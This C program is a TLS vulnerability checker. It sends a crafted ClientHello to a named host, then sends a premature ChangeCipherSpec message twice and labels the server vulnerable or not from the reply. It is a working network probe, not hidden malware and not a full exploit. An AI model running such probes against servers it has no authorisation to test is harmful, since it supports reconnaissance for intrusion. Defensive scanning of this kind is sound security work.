/*
 * Copyright 2014 Ramon de C Valle
 *
 * Copying and distribution of this file, with or without modification,
 * are permitted in any medium without royalty provided the copyright
 * notice and this notice are preserved.  This file is offered as-is,
 * without any warranty.
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <ctype.h>
#include <time.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
 
char handshake_message[] =
    "\x16" // handshake
    "\x03\x01"
    "\x00\x9a"
    "\x01" // client_hello
    "\x00\x00\x96"
    "\x03\x01"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00"
    "\x00\x68"
    "\xc0\x14"
    "\xc0\x13"
    "\xc0\x12"
    "\xc0\x11"
    "\xc0\x10"
    "\xc0\x0f"
    "\xc0\x0e"
    "\xc0\x0d"
    "\xc0\x0c"
    "\xc0\x0b"
    "\xc0\x0a"
    "\xc0\x09"
    "\xc0\x08"
    "\xc0\x07"
    "\xc0\x06"
    "\xc0\x05"
    "\xc0\x04"
    "\xc0\x03"
    "\xc0\x02"
    "\xc0\x01"
    "\x00\x39"
    "\x00\x38"
    "\x00\x37"
    "\x00\x36"
    "\x00\x35"
    "\x00\x33"
    "\x00\x32"
    "\x00\x31"
    "\x00\x30"
    "\x00\x2f"
    "\x00\x16"
    "\x00\x15"
    "\x00\x14"
    "\x00\x13"
    "\x00\x12"
    "\x00\x11"
    "\x00\x10"
    "\x00\x0f"
    "\x00\x0e"
    "\x00\x0d"
    "\x00\x0c"
    "\x00\x0b"
    "\x00\x0a"
    "\x00\x09"
    "\x00\x08"
    "\x00\x07"
    "\x00\x06"
    "\x00\x05"
    "\x00\x04"
    "\x00\x03"
    "\x00\x02"
    "\x00\x01"
    "\x01"
    "\x00"
    "\x00\x05"
    "\x00\x0f"
    "\x00\x01"
    "\x01"
;
 
void
usage(const char *name)
{
    fprintf(stderr, "Usage: %s [-123dhv][-p port] host\n", name);
}
 
int
hexdump(FILE *stream, const char *buf, size_t size)
{
    size_t i, j;
 
    for (i = 0; i < size; i += 16) {
        fprintf(stream, "%08zx  ", i);
 
        for (j = 0; j < 16; j++) {
            if (j == 8)
                fprintf(stream, " ");
 
            if (i + j >= size)
                fprintf(stream, "   ");
            else
                fprintf(stream, "%02hhx ", buf[i + j]);
        }
 
        fprintf(stream, " ");
 
        for (j = 0; j < 16; j++) {
            if (i + j >= size)
                fprintf(stream, " ");
            else {
                if (isprint(buf[i + j]) && !isspace(buf[i + j]))
                    fprintf(stream, "%c", buf[i + j]);
                else
                    fprintf(stream, ".");
            }
        }
 
        fprintf(stream, "\n");
    }
 
    return size;
}
 
char ccs_message[] =
    "\x14" // change_cipher_spec
    "\x03\x01"
    "\x00\x01"
    "\x01"
;
 
int
main(int argc, char *argv[])
{
    int port = 443;
    int c, s;
    int debug = 0, verbose = 0;
    struct sockaddr_in sin;
    struct hostent *he;
    int count, i;
    int ccs_sent = 0;
 
    while ((c = getopt(argc, argv, "123dhp:v")) != -1) {
        switch (c) {
        case '1':
            handshake_message[10] = '\x02';
            break;
 
        case '2':
            handshake_message[10] = '\x03';
            break;
 
        case '3':
            handshake_message[2] = handshake_message[10] = '\x00';
            break;
 
        case 'd':
            debug = 1;
            break;
 
        case 'h':
            usage(argv[0]);
            exit(EXIT_FAILURE);
 
        case 'p':
            port = atoi(optarg);
            break;
 
        case 'v':
            verbose = 1;
            break;
 
        default:
            usage(argv[0]);
            exit(EXIT_FAILURE);
        }
    }
 
    if (argv[optind] == NULL) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }
 
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
 
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    if ((sin.sin_addr.s_addr = inet_addr(argv[optind])) == -1) {
        if ((he = gethostbyname(argv[optind])) == NULL) {
            errno = EADDRNOTAVAIL;
            perror("gethostbyname");
            exit(EXIT_FAILURE);
        }
        memcpy(&sin.sin_addr.s_addr, he->h_addr, sizeof(sin.sin_addr.s_addr));
    }
 
    if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
        perror("connect");
        exit(EXIT_FAILURE);
    }
 
    if (debug || verbose)
        fprintf(stderr, "Connected to %s:%d\n", argv[optind], port);
 
    // gmt_unix_time
    *((uint32_t *)&handshake_message[11]) = htonl((uint32_t)time(NULL));
 
    // (not so) random_bytes
    srandom((unsigned int)time(NULL));
    for (i = 0; i < 28; i++)
        handshake_message[15 + i] = random() & 0xff;
 
    if ((count = send(s, handshake_message, sizeof(handshake_message) - 1, 0)) == -1) {
        perror("send");
        exit(EXIT_FAILURE);
    }
 
    if (debug)
        hexdump(stderr, handshake_message, sizeof(handshake_message) - 1);
 
    if (debug || verbose)
        fprintf(stderr, "%d bytes sent\n", count);
 
    for (;;) {
        fd_set fds;
        char buf[16384];
 
        FD_ZERO(&fds);
        FD_SET(s, &fds);
 
        if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) == -1) {
            if (errno == EINTR)
                continue;
            perror("select");
            exit(EXIT_FAILURE);
        }
 
        if (FD_ISSET(s, &fds)) {
            if ((count = read(s, buf, sizeof(buf))) < 1) {
                if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
                    continue;
                else
                    break;
            }
 
            if (debug)
                hexdump(stderr, buf, count);
 
            if (debug || verbose)
                fprintf(stderr, "%d bytes received\n", count);
 
            if (ccs_sent) {
                for (i = 0; i < count; i++) {
                    if (buf[i] == '\x15' && // alert
                        buf[i + 1] == '\x03' &&
                        buf[i + 5] == '\x02') { // fatal
 
                        if (buf[i + 6] == '\x0a') { // unexpected_message
                           printf("%s: Not Vulnerable\n", inet_ntoa(sin.sin_addr));
                           exit(EXIT_SUCCESS);
                        } else
                           break;
                    }
                }
 
                break;
            } else {
                for (i = 0; i < count; i++) {
                    if (buf[i] == '\x16' && // handshake
                        buf[i + 1] == '\x03' &&
                        buf[i + 5] == '\x02' && // server_hello
                        buf[i + 9] == '\x03') {
 
                        // Use the protocol version sent by the server.
                        ccs_message[2] = buf[i + 10];
                    }
 
                    if (buf[i] == '\x16' && // handshake
                        buf[i + 1] == '\x03' &&
                        buf[i + 3] == '\x00' &&
                        buf[i + 4] == '\x04' &&
                        buf[i + 5] == '\x0e' && // server_hello_done
                        buf[i + 6] == '\x00' &&
                        buf[i + 7] == '\x00' &&
                        buf[i + 8] == '\x00') {
 
                        /* Send the change cipher spec message twice to
                         * force an alert in the case the server is not
                         * patched.
                         */
 
                        if ((count = send(s, ccs_message, sizeof(ccs_message) - 1, 0)) == -1) {
                            perror("send");
                            exit(EXIT_FAILURE);
                        }
 
                        if (debug)
                            hexdump(stderr, ccs_message, sizeof(ccs_message) - 1);
 
                        if (debug || verbose)
                            fprintf(stderr, "%d bytes sent\n", count);
 
                        if ((count = send(s, ccs_message, sizeof(ccs_message) - 1, 0)) == -1) {
                            perror("send");
                            exit(EXIT_FAILURE);
                        }
 
                        if (debug)
                            hexdump(stderr, ccs_message, sizeof(ccs_message) - 1);
 
                        if (debug || verbose)
                            fprintf(stderr, "%d bytes sent\n", count);
 
                        ccs_sent = 1;
                    }
                }
            }
        }
    }
 
    printf("%s: Vulnerable\n", inet_ntoa(sin.sin_addr));
    exit(EXIT_SUCCESS);
}